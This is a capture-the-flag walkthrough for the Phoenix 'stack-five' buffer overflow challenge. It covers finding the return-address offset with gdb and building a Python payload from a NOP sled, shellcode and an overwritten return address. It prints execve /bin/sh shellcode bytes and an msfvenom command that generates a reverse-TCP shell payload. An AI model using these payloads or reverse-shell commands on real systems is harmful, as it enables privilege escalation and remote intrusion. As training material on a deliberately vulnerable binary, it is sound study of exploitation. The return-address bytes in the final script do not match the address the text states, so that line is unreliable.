# Stack Five
Stack Five is the 6th challenge of the Phoenix exploitation set of challenges, it is available at https://exploit.education/

## Taking a first look at the binary
The binary name is `stack-five`, it has the setuid and setgid bit enabled which means it can be run as root with most users on the system

It has been compiled as a ELF 64-bit LSB (little endian) binary and is not stripped you can see by yourself by looking at the output of the following output :
```
pwndbg> ! file stack-five  
stack-five: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x  
86_64.so.1, not stripped
```

#### File Security Informations
```
pwndbg> checksec  
[*] '/opt/phoenix/amd64/stack-five'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)  
   RWX:      Has RWX segments  
   RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'
```
In this case everything seems disabled and we even have RWX segments, which means we could read, write and execute data in those segments.
We also have NX disabled, which means we're gonna have a easier time executing code on the stack.

## Having a look at the instructions on the website
We can check the following link for the challenge instructions
http://exploit.education/phoenix/stack-five/
```
As opposed to executing an existing function in the binary, this time we’ll be introducing the concept of “shell code”, and being able to execute our own code.

Hints
	- Don’t feel like you have to write your own shellcode just yet – there’s plenty on the internet.

	- If you wish to debug your shellcode, be sure to make use of the [breakpoint](https://en.wikipedia.org/wiki/Breakpoint) instruction. On i386 / x86_64, that’s 0xcc, and will cause a SIGTRAP.

	- Make sure you remove those breakpoints after you’re done.
```

Instructions are pretty straight forward, we need to overwrite a buffer and execute some shellcode on the stack.

They mention that we can find pretty much any type of shellcode online and this is absolutely true, although not every shellcode works on every architecture, if you're overflowing a x64 ELF Binary, you would usually try to find some Intel x86_64 shellcode.

They also mention that we can use a SIGTRAP to debug our shellcode for this we'll use the opcode `0xcc` right before our shellcode, when run with a debugger this will cause the program to automatically break before our shellcode and therefore allow us to analyse it step by step.

This is the following code we'll be exploiting in that challenge.
```c
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

Notice the `char buffer[128]` is 128 bytes in size, if we input more than that we should start overwriting data on the stack and therefore we'll cause a segmentation fault.

## First Run
Alright so now we now pretty much what we need to do let's run our program for a first time...
```
./stack-five   
Welcome to phoenix/stack-five, brought to you by https://exploit.education  
12345
```

We saw the source we pretty much already knew what it did, but running the program before trying to exploit it, is always a good practice.

## Find RIP Offset on the Stack
Alright so we're going to first proof we can cause a `SEGFAULT` by overwriting our buffer, to do that we'll  send a cyclic pattern of 200 characters to our program, usually it should make it crash since our buffer accepts only `128 bytes`.
```
./stack-five <<<$(cyclic 200)
Welcome to phoenix/stack-five, brought to you by https://exploit.education  
zsh: segmentation fault  ./stack-five <<< $(cyclic 200)
```

So we did cause a `SEGFAULT`, now we can start up the program in gdb and determine our RIP offset at the crash moment using gdb.
```
pwndbg> r <<<$(cyclic 200)
► 0x4005a3 <start_level+22> ret <0x6261616b6261616a>
```

We see that our program is trying to return at adress 0x6261616b6261616a, let's see which offset that corresponds to using cyclic, note that cyclic only accepts 4 bytes addresses, so we're going to send only `0x6261616a` to cyclic, note that we use the second part of that address cause we're dealing with little endian.
```
pwndbg> cyclic -l 0x6261616a  
136
```

We now have our offset ! It's 136 so we need to send a padding of 136 bytes before RIP to succeed our attack.

Note that our shellcode will need to be smaller than 136 bytes in order to work.

## Write exploit Script
Armed with the RIP Offset we can make the program return wherever we want, we basically have complete (kind of) control over it, we can now start writing our script.
```py
#!/usr/bin/python3
import sys
NOPS_NUMBER = 30 				# NOPS SLED COUNT
NOPS = b'\x90' * NOPS_NUMBER 	# NOPS SLED
SHELLCODE = b"" 				# OUR SHELLCODE
RIP = b"" 						# RETURN ADDRESS
								# OUR PADDING
PADDING = b'A' * (136 - NOPS_NUMBER - len(SHELLCODE))
								# OUR PAYLOAD
PAYLOAD = NOPS + SHELLCODE + PADDING + RIP
sys.stdout.buffer.write(PAYLOAD)
```

First thing first, you need to note that GDB adds a couple extra environment variables in the program which changes a bit the address offset, to overcome this you **need** to unset the `LINES` and `COLUMNS` environment variables **This is an important step and can easily be forgotten when restarting gdb**.
```
pwndbg> unset env LINES
pwndbg> unset env COLUMNS
```

Next we need to find where our NOPS will be place on the stack so we can jump to them and eventually execute our shellcode.

For this we're going to debug our program with gdb, and put a breakpoint at the `ret` instruction of the `start_level` function, which is our vulnerable function.
```
pwndbg> disass start_level  
Dump of assembler code for function start_level:  
  0x000000000040058d <+0>:     push   rbp  
  0x000000000040058e <+1>:     mov    rbp,rsp  
  0x0000000000400591 <+4>:     add    rsp,0xffffffffffffff80  
  0x0000000000400595 <+8>:     lea    rax,[rbp-0x80]  
  0x0000000000400599 <+12>:    mov    rdi,rax  
  0x000000000040059c <+15>:    call 0x4003f0 <gets@plt>  
  0x00000000004005a1 <+20>:    nop  
  0x00000000004005a2 <+21>:    leave   
=> 0x00000000004005a3 <+22>:    ret   
End of assembler dump.
```

We can put our breakpoint at `start_level+21`
```
pwndbg> b *start_level+21  
Breakpoint 1 at 0x4005a2
```

Now, let's run our program with our script as input.
```
pwndbg> r <<<$(python3 /home/spacek9/Documents/Phoenix-Exploitation/stack-five_exploit.py)
```

We should hit our breakpoint and we can step over one time using `ni`, this will make sure the `leave` instruction will be executed, now that our program is breaked on the `ret` instruction let's analyze the stack
```
pwndbg> x/-150x $rsp  
0x7fffffffdb30: 0x00003e00      0x04000001      0x00000000      0x00000000  
0x7fffffffdb40: 0x00000000      0x00000000      0xf7dc88a6      0x00007fff  
0x7fffffffdb50: 0x00000038      0x00000000      0x00000000      0x00000000  
0x7fffffffdb60: 0xffffddf8      0x00007fff      0xffffe028      0x00007fff  
0x7fffffffdb70: 0xf7ffd9e0      0x00007fff      0xf7ff8000      0x00007fff  
0x7fffffffdb80: 0x8683fbf8      0x00000000      0x00000000      0x00000000  
0x7fffffffdb90: 0x00000000      0x00000000      0x00400040      0x00000000  
0x7fffffffdba0: 0x00000038      0x00000000      0x00000007      0x00000000  
0x7fffffffdbb0: 0x00001000      0x00000000      0xf7d6b000      0x00007fff  
0x7fffffffdbc0: 0x00000000      0x00000000      0x00400420      0x00000000  
0x7fffffffdbd0: 0x00000000      0x00000000      0x000003e8      0x00000000  
0x7fffffffdbe0: 0x000003e8      0x00000000      0x000003e8      0x00000000  
0x7fffffffdbf0: 0x000003e8      0x00000000      0xffffe179      0x00007fff  
0x7fffffffdc00: 0x178bfbff      0x00000000      0x00000064      0x00000000  
0x7fffffffdc10: 0x00000000      0x00000000      0x00000000      0x00000000  
0x7fffffffdc20: 0x00000000      0x00000000      0xf7db6c43      0x00007fff  
0x7fffffffdc30: 0xffffdc7f      0x00007fff      0x00000000      0x00000000  
0x7fffffffdc40: 0xf7ffc528      0x00007fff      0x00000400      0x00000000  
0x7fffffffdc50: 0xf7ffb200      0x00007fff      0xffffdd00      0x00007fff  
0x7fffffffdc60: 0xffffdd00      0x00007fff      0xf7db6f2e      0x00007fff  
0x7fffffffdc70: 0x00b0bc7e      0x00000000      0x00000001      0x90000000  
0x7fffffffdc80: 0xf7ffb200      0x00007fff      0xf7db7584      0x00007fff  
0x7fffffffdc90: 0x00400200      0x00000000      0xf7ffc5b8      0x00007fff  
0x7fffffffdca0: 0x00400238      0x00000000      0xffffdd00      0x00007fff  
0x7fffffffdcb0: 0xffffdd80      0x00007fff      0xffffde08      0x00007fff  
0x7fffffffdcc0: 0x004005a4      0x00000000      0x00000000      0x00000000  
0x7fffffffdcd0: 0x00000000      0x00000000      0xf7db8e3f      0x00007fff  
0x7fffffffdce0: 0xffffdd5f      0x00007fff      0xffffddf8      0x00007fff  
0x7fffffffdcf0: 0xffffdd80      0x00007fff      0x004005a1      0x00000000  
0x7fffffffdd00: 0x90909090      0x90909090      0x90909090      0x90909090  
0x7fffffffdd10: 0x90909090      0x90909090      0x90909090      0xc0319090  
0x7fffffffdd20: 0x9dd1bb48      0x8cd09196      0xf748ff97      0x5f5453db  
0x7fffffffdd30: 0x54575299      0x0f3bb05e      0x42424205      0x42424242  
0x7fffffffdd40: 0x42424242      0x42424242      0x42424242      0x42424242  
0x7fffffffdd50: 0x42424242      0x42424242      0x42424242      0x42424242  
0x7fffffffdd60: 0x42424242      0x42424242      0x42424242      0x42424242  
0x7fffffffdd70: 0x42424242      0x42424242      0x42424242      0x42424242  
0x7fffffffdd80: 0x42424242      0x42424242
```

Notice our NOPSLED starting at the address `0x7fffffffdd00`, we can set the RIP to jump at this address and therefore executing our NOPSLED + SHELLCODE, let's add that address to our script
```py
#!/usr/bin/python3
import sys
NOPS_NUMBER = 30 				# NOPS SLED COUNT
NOPS = b'\x90' * NOPS_NUMBER 	# NOPS SLED
SHELLCODE = b"" 				# OUR SHELLCODE
								# RETURN ADDRESS [0x7fffffffdd00]
RIP = b"\x00\xdd\xff\xff\xff\xf7\x00\x00"
								# OUR PADDING
PADDING = b'A' * (136 - NOPS_NUMBER - len(SHELLCODE))
								# OUR PAYLOAD
PAYLOAD = NOPS + SHELLCODE + PADDING + RIP
sys.stdout.buffer.write(PAYLOAD)
```

Now we just need a shellcode, there is multiple shellcode you can use, you can either go on http://shell-storm.org/shellcode/ or generate your own using msfvenom. **If you generate your own shellcode with msfvenom, make sure to use a non-staged payload, since the staged one is too big and probably won't work with that program**

So the shellcode the most appropriate for this program would definitely be the following one:
```
FOUND AT SHELL-STORM : http://shell-storm.org/shellcode/files/shellcode-905.php

\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
```

But i seem to have problem with this shellcode on my current OS, so i will just use a msfvenom generated payload.
```
msfvenom
--------
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f py
```
or
```
msfconsole
----------
$ use payload/linux/x64/exec
$ set CMD /bin/bash
$ generate -b '\x00\xff' -f python
```

Alright so we can put your `SHELLCODE` inside our python script and you can run it, if you have any "BUS Error" or "Illegal hardware instruction" problem please refer to this link
https://reverseengineering.stackexchange.com/questions/2983/how-to-predict-address-space-layout-differences-between-real-and-gdb-controlled
Basically make sure GDB is using the same address space as your kernel does when it runs the program.

![image](https://user-images.githubusercontent.com/61102077/130929772-a5df2734-ba5a-46c4-8771-250fd156ee31.png)
GG You completed stack-five !!!
Try to exploit the program using the shell-storm shell code now :)
